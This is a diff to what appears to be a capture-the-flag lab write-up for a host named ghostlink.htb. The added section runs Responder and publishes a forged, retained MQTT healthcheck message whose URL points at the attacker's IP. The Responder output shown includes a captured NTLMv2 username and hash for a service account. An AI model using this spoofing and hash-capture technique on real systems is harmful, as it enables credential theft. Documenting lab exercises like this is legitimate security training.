@@ -281,7 +281,26 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Attack failed but discovered a user
 
 
-trying with responder and setting the ip address 172.1
+trying with responder and setting the ip address 172.16.20.10 (`systems/node/secureshare/healthcheck`)
+
+```
+sudo responder -I tun0
+```
+
+```bash
+mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
+  -m '{"timestamp":"2026-29-10-21:24:27","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.148/healthcheck","lastCheckSecAgo":42,"responseCode":"200","ip":"172.16.20.10"}}' 
+```
+
+```
+[+] Listening for events...                                                                                         
+
+[HTTP] NTLMv2 Client   : 10.129.189.74
+[HTTP] NTLMv2 Username : ghostlink\svc_canary
+[HTTP] NTLMv2 Hash     : svc_canary::ghostlink:afdbf9989345f00d:319C8080BFC4AB1CD3948BEF95E05C9C:0101000000000000F3A75D113568DD01767DD94FC72611DA00000000020008004200510036004B0001001E00570049004E002D0058003200460035004A005A0032005300530059004A00040014004200510036004B002E004C004F00430041004C0003003400570049004E002D0058003200460035004A005A0032005300530059004A002E004200510036004B002E004C004F00430041004C00050014004200510036004B002E004C004F00430041004C000800500050000000000000000000000000400000E18E8969BA1E95C7DF3D5DAEB3CFABE1EA986B2966C195F17A21E8739BA1403F9EA6E0B56B1FC312F086641EDEA22BE27F255F4E3441AFE2B8AB0BC43190031D0A001000000000000000000000000000000000000900220048005400540050002F00310030002E00310030002E00310034002E003100340038000000000000000000                                                           
+[+] Exiting...
+
+```
 
 ---
 ## Foothold
